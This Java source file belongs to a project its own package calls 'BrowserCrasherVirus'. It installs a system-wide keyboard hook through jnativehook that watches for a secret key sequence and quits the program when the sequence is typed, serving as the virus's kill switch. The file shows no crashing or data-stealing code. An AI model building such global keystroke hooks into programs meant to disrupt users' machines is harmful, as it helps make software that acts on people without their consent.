package BrowserCrasherVirus;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class keyListener implements NativeKeyListener {

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		if (e.getKeyCode() == BrowserCrasherVirus.code[BrowserCrasherVirus.index]) {
			BrowserCrasherVirus.index++;
			if (BrowserCrasherVirus.index >= BrowserCrasherVirus.code.length) System.exit(0);
		}
		else BrowserCrasherVirus.index = 0;
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		BrowserCrasherVirus.index = 0;
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		BrowserCrasherVirus.index = 0;
	}

}
